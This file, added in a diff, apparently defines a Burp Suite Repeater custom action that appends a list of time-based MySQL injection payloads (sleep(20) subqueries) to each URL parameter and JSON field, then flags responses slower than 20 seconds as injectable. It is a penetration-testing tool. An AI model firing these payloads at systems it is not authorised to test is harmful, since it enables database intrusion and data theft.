@@ -1,0 +1,133 @@
+id: 0351a044-ba2c-433a-9e1c-08d2797e7c74
+name: MySQLTimeBased
+function: CUSTOM_ACTION
+location: REPEATER
+source: "/**\r\n* Append a time-based MySQL payload to each query parameter, one at\
+  \ a time.\r\n* Sends each mutated request sequentially and logs high-level timing\
+  \ data\r\n* so you can watch for slow responses in Logger or the console.\r\n* Also\
+  \ reports the findings to the Issues dashboard.\r\n* Handles both regular parameters\
+  \ and JSON-encoded parameters.\r\n* @author slicingmelon\r\n**/\r\n\r\nvar payloads\
+  \ = java.util.List.of(\r\n\t\"'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z\",\r\n\t\
+  \"'XOR(if(isnull(nullif(now(),sysdate())),sleep(20),0))XOR'Z\",\r\n\t\"'(select(1)from(select(sleep(20)))a)'\"\
+  ,\r\n\t\"(select(1)from(select(sleep(20)))a)\",\r\n\t\"(select(1)from(select(sleep(20)))a)--\
+  \ z\",\r\n\t\"'+(select(1)from(select(sleep(20)))a)+'\",\r\n\t\"-(select(1)from(select(sleep(20)))a)\"\
+  ,\r\n\t\",(select(1)from(select(sleep(20)))a)\",\r\n\t\",(select(1)from(select(sleep(20)))a)--\
+  \ z\",\r\n\t\"'OR(select(1)from(select(sleep(20)))a)OR'Z\",\r\n\t\"'AND(select(1)from(select(sleep(20)))a)AND'Z\"\
+  ,\r\n\t\" AND (select(1)from(select(sleep(20)))a)-- z\",\r\n\t\"' AND (select(1)from(select(sleep(20)))a)--\
+  \ z\",\r\n\t\") AND (select(1)from(select(sleep(20)))a)-- z\",\r\n\t\"') AND (select(1)from(select(sleep(20)))a)--\
+  \ z\",\r\n\t\"->test\\\"',(select(1)from(select(sleep(20)))a)-- z\\\"'\",\r\n\t\"\
+  ->test\\\"'))# (select(1)from(select(sleep(20)))a)-- z\",\r\n\t\"->test\\\"' ASC,\
+  \ (select(1)from(select(sleep(20)))a)) DESC-- z\\\"'\"\r\n);\r\n\r\nvar bypassCache\
+  \ = true;\r\nvar detectionThresholdMs = 20000L;\r\n\r\nvar detectionFound = false;\r\
+  \n\r\n// Custom URL encode - only encodes space, +, #, = (characters that break\
+  \ URL structure)\r\nvar customUrlEncode = (java.util.function.Function<String, String>)(str\
+  \ -> {\r\n\treturn str.replace(\" \", \"%20\")\r\n\t          .replace(\"+\", \"\
+  %2b\")\r\n\t          .replace(\"#\", \"%23\")\r\n\t          .replace(\"=\", \"\
+  %3D\");\r\n});\r\n\r\n// Helper function to inject payload into a JSON string\r\n\
+  var injectIntoJson = (java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String,\
+  \ String>>>)((jsonStr, payload) -> {\r\n\tvar results = new java.util.ArrayList<java.util.Map.Entry<String,\
+  \ String>>();\r\n\ttry {\r\n\t\tvar jsonNode = JsonNode.jsonNode(jsonStr);\r\n\t\
+  \tvar jsonObj = jsonNode.asObject();\r\n\t\tvar jsonMap = jsonObj.asMap();\r\n\t\
+  \t\r\n\t\t// Iterate through each field in the JSON object\r\n\t\tfor (var entry\
+  \ : jsonMap.entrySet()) {\r\n\t\t\tString targetKey = entry.getKey();\r\n\t\t\t\r\
+  \n\t\t\t// Create a new JSON object with payload injected into this field\r\n\t\t\
+  \tvar newJsonObj = JsonObjectNode.jsonObjectNode();\r\n\t\t\t\r\n\t\t\tfor (var\
+  \ e : jsonMap.entrySet()) {\r\n\t\t\t\tString k = e.getKey();\r\n\t\t\t\tvar valueNode\
+  \ = e.getValue();\r\n\t\t\t\t\r\n\t\t\t\t// Get string value from the node\r\n\t\
+  \t\t\tString valueStr = \"\";\r\n\t\t\t\tif (valueNode.isString()) {\r\n\t\t\t\t\
+  \tvalueStr = valueNode.asString();\r\n\t\t\t\t} else if (valueNode.isNull()) {\r\
+  \n\t\t\t\t\tvalueStr = \"\";\r\n\t\t\t\t} else {\r\n\t\t\t\t\tvalueStr = valueNode.toJsonString();\r\
+  \n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\tif (k.equals(targetKey)) {\r\n\t\t\t\t\t// Inject\
+  \ payload into this field\r\n\t\t\t\t\tnewJsonObj.putString(k, valueStr + payload);\r\
+  \n\t\t\t\t} else {\r\n\t\t\t\t\t// Keep original value\r\n\t\t\t\t\tnewJsonObj.putString(k,\
+  \ valueStr);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\t// Convert to JSON string\r\
+  \n\t\t\tString mutatedJsonStr = newJsonObj.toJsonString();\r\n\t\t\tresults.add(new\
+  \ java.util.AbstractMap.SimpleEntry<>(targetKey, mutatedJsonStr));\r\n\t\t}\r\n\t\
+  } catch (Exception e) {\r\n\t\tlogging().logToError(\"[MySQLTimeBased] Failed to\
+  \ parse JSON: \" + e.getMessage());\r\n\t}\r\n\treturn results;\r\n});\r\n\r\nvar\
+  \ baseRequest = requestResponse.request();\r\nif (baseRequest == null) return;\r\
+  \n\r\n// Get all URL parameters (order preserved by Montoya API)\r\nvar urlParameters\
+  \ = baseRequest.parameters().stream()\r\n\t.filter(p -> p.type() == HttpParameterType.URL)\r\
+  \n\t.toList();\r\n\r\nif (urlParameters.isEmpty()) {\r\n\tlogging().logToOutput(\"\
+  [MySQLTimeBased] No URL parameters found.\");\r\n\treturn;\r\n}\r\n\r\nvar alphabet\
+  \ = \"abcdefghijklmnopqrstuvwxyz0123456789\";\r\n\r\nlogging().logToOutput(\"[MySQLTimeBased]\
+  \ Started...\");\r\n\r\nfor (HttpParameter parameter : urlParameters) {\r\n\tString\
+  \ name = parameter.name();\r\n\tString value = parameter.value();\r\n\t\r\n\t//\
+  \ URL decode the value to check if it's JSON\r\n\tvar decodedValue = api().utilities().urlUtils().decode(value);\r\
+  \n\t\r\n\t// Check if it's a JSON object\r\n\tif (decodedValue != null && !decodedValue.isEmpty()\
+  \ && \r\n\t    decodedValue.strip().startsWith(\"{\") && decodedValue.strip().endsWith(\"\
+  }\") &&\r\n\t    api().utilities().jsonUtils().isValidJson(decodedValue)) {\r\n\t\
+  \t// Handle JSON parameter - inject into each JSON field\r\n\t\tlogging().logToOutput(\"\
+  [MySQLTimeBased] Detected JSON parameter: \" + name);\r\n\t\t\r\n\t\tfor (String\
+  \ payload : payloads) {\r\n\t\t\tvar jsonMutations = injectIntoJson.apply(decodedValue,\
+  \ payload);\r\n\t\t\t\r\n\t\t\tfor (var jsonMutation : jsonMutations) {\r\n\t\t\t\
+  \tvar jsonField = jsonMutation.getKey();\r\n\t\t\t\tvar mutatedJson = jsonMutation.getValue();\r\
+  \n\t\t\t\t\r\n\t\t\t\t// URL encode the mutated JSON (standard encoding for JSON)\r\
+  \n\t\t\t\tvar encodedMutatedJson = api().utilities().urlUtils().encode(mutatedJson);\r\
+  \n\t\t\t\t\r\n\t\t\t\t// Create new parameter with mutated JSON\r\n\t\t\t\tvar newParam\
+  \ = HttpParameter.urlParameter(name, encodedMutatedJson);\r\n\t\t\t\t\r\n\t\t\t\t\
+  // Replace parameter (order preserved automatically)\r\n\t\t\t\tvar mutatedRequest\
+  \ = baseRequest.withRemovedParameters(parameter)\r\n\t\t\t\t                   \
+  \             .withAddedParameters(newParam);\r\n\t\t\t\t\r\n\t\t\t\t// Add cache\
+  \ buster if enabled\r\n\t\t\t\tif (bypassCache) {\r\n\t\t\t\t\tvar cacheBuster =\
+  \ api().utilities().randomUtils().randomString(14, alphabet);\r\n\t\t\t\t\tmutatedRequest\
+  \ = mutatedRequest.withAddedParameters(\r\n\t\t\t\t\t\tHttpParameter.urlParameter(\"\
+  _czb\", cacheBuster)\r\n\t\t\t\t\t);\r\n\t\t\t\t}\r\n\t\t\t\t\r\n\t\t\t\tvar result\
+  \ = api().http().sendRequest(mutatedRequest);\r\n\t\t\t\tif (!result.hasResponse())\
+  \ {\r\n\t\t\t\t\tlogging().logToOutput(\"[WARN] No response for param \" + name\
+  \ + \" (JSON field: \" + jsonField + \")\");\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t\
+  }\r\n\t\t\t\t\r\n\t\t\t\tvar timingOpt = result.timingData();\r\n\t\t\t\tif (timingOpt.isEmpty())\
+  \ continue;\r\n\t\t\t\t\r\n\t\t\t\tvar timing = timingOpt.get();\r\n\t\t\t\tjava.time.Duration\
+  \ tStart = timing.timeBetweenRequestSentAndStartOfResponse();\r\n\t\t\t\tjava.time.Duration\
+  \ tEnd = timing.timeBetweenRequestSentAndEndOfResponse();\r\n\t\t\t\tlong startMs\
+  \ = (tStart != null ? tStart.toMillis() : -1);\r\n\t\t\t\tlong endMs = (tEnd !=\
+  \ null ? tEnd.toMillis() : -1);\r\n\t\t\t\t\r\n\t\t\t\tif (startMs >= detectionThresholdMs\
+  \ && startMs != -1) {\r\n\t\t\t\t\tlogging().logToOutput(\"[MySQLTimeBased] SQL\
+  \ injection detected in JSON param \" + name + \", field: \" + jsonField + \", payload:\
+  \ \" + payload);\r\n\t\t\t\t\thttpEditor.responsePane().set(result.response().toByteArray());\r\
+  \n\t\t\t\t\thttpEditor.requestPane().set(mutatedRequest.toByteArray());\r\n\t\t\t\
+  \t\tdetectionFound = true;\r\n\t\t\t\t\t\r\n\t\t\t\t\tvar detail = String.format(\"\
+  JSON parameter '%s', field '%s' was vulnerable to time-based SQL injection when\
+  \ payload '%s' was used (response took %dms).\", name, jsonField, payload, endMs);\r\
+  \n\t\t\t\t\tapi().siteMap().add(\r\n\t\t\t\t\t\tburp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(\r\
+  \n\t\t\t\t\t\t\t\"MySQL Time Based Injection (JSON)\",\r\n\t\t\t\t\t\t\tdetail,\r\
+  \n\t\t\t\t\t\t\t\"Sanitize input to prevent SQL injections.\",\r\n\t\t\t\t\t\t\t\
+  mutatedRequest.url(),\r\n\t\t\t\t\t\t\tburp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,\r\
+  \n\t\t\t\t\t\t\tburp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,\r\
+  \n\t\t\t\t\t\t\t\"\",\r\n\t\t\t\t\t\t\t\"\",\r\n\t\t\t\t\t\t\tburp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,\r\
+  \n\t\t\t\t\t\t\tresult\r\n\t\t\t\t\t\t)\r\n\t\t\t\t\t);\r\n\t\t\t\t}\r\n\t\t\t}\r\
+  \n\t\t}\r\n\t} else {\r\n\t\t// Handle regular parameter - inject directly\r\n\t\
+  \tfor (String payload : payloads) {\r\n\t\t\t// Custom URL encode the payload (only\
+  \ space, +, #, =)\r\n\t\t\tvar encodedPayload = customUrlEncode.apply(payload);\r\
+  \n\t\t\t\r\n\t\t\t// Create new parameter with payload appended\r\n\t\t\tvar newParam\
+  \ = HttpParameter.urlParameter(name, value + encodedPayload);\r\n\t\t\t\r\n\t\t\t\
+  // Replace parameter (order preserved automatically)\r\n\t\t\tvar mutatedRequest\
+  \ = baseRequest.withRemovedParameters(parameter)\r\n\t\t\t                     \
+  \           .withAddedParameters(newParam);\r\n\t\t\t\r\n\t\t\t// Add cache buster\
+  \ if enabled\r\n\t\t\tif (bypassCache) {\r\n\t\t\t\tvar cacheBuster = api().utilities().randomUtils().randomString(14,\
+  \ alphabet);\r\n\t\t\t\tmutatedRequest = mutatedRequest.withAddedParameters(\r\n\
+  \t\t\t\t\tHttpParameter.urlParameter(\"_czb\", cacheBuster)\r\n\t\t\t\t);\r\n\t\t\
+  \t}\r\n\t\t\t\r\n\t\t\tvar result = api().http().sendRequest(mutatedRequest);\r\n\
+  \t\t\tif (!result.hasResponse()) {\r\n\t\t\t\tlogging().logToOutput(\"[WARN] No\
+  \ response for param \" + name);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\t\r\n\t\
+  \t\tvar timingOpt = result.timingData();\r\n\t\t\tif (timingOpt.isEmpty()) continue;\r\
+  \n\t\t\t\r\n\t\t\tvar timing = timingOpt.get();\r\n\t\t\tjava.time.Duration tStart\
+  \ = timing.timeBetweenRequestSentAndStartOfResponse();\r\n\t\t\tjava.time.Duration\
+  \ tEnd = timing.timeBetweenRequestSentAndEndOfResponse();\r\n\t\t\tlong startMs\
+  \ = (tStart != null ? tStart.toMillis() : -1);\r\n\t\t\tlong endMs = (tEnd != null\
+  \ ? tEnd.toMillis() : -1);\r\n\t\t\t\r\n\t\t\tif (startMs >= detectionThresholdMs\
+  \ && startMs != -1) {\r\n\t\t\t\tlogging().logToOutput(\"[MySQLTimeBased] SQL injection\
+  \ detected in param \" + name + \" using payload: \" + payload);\r\n\t\t\t\thttpEditor.responsePane().set(result.response().toByteArray());\r\
+  \n\t\t\t\thttpEditor.requestPane().set(mutatedRequest.toByteArray());\r\n\t\t\t\t\
+  detectionFound = true;\r\n\t\t\t\t\r\n\t\t\t\tvar detail = String.format(\"Parameter\
+  \ '%s' was vulnerable to time-based SQL injection when payload '%s' was used (response\
+  \ took %dms).\", name, payload, endMs);\r\n\t\t\t\tapi().siteMap().add(\r\n\t\t\t\
+  \t\tburp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(\r\n\t\t\t\t\t\t\
+  \"MySQL Time Based Injection\",\r\n\t\t\t\t\t\tdetail,\r\n\t\t\t\t\t\t\"Sanitize\
+  \ input to prevent SQL injections.\",\r\n\t\t\t\t\t\tmutatedRequest.url(),\r\n\t\
+  \t\t\t\t\tburp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,\r\n\t\t\
+  \t\t\t\tburp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,\r\n\t\
+  \t\t\t\t\t\"\",\r\n\t\t\t\t\t\t\"\",\r\n\t\t\t\t\t\tburp.api.montoya.scanner.audit.issues.AuditIssueSeverity.HIGH,\r\
+  \n\t\t\t\t\t\tresult\r\n\t\t\t\t\t)\r\n\t\t\t\t);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\
+  }\r\n\r\nif (!detectionFound) {\r\n\tlogging().logToOutput(\"[MySQLTimeBased] No\
+  \ findings.\");\r\n}"
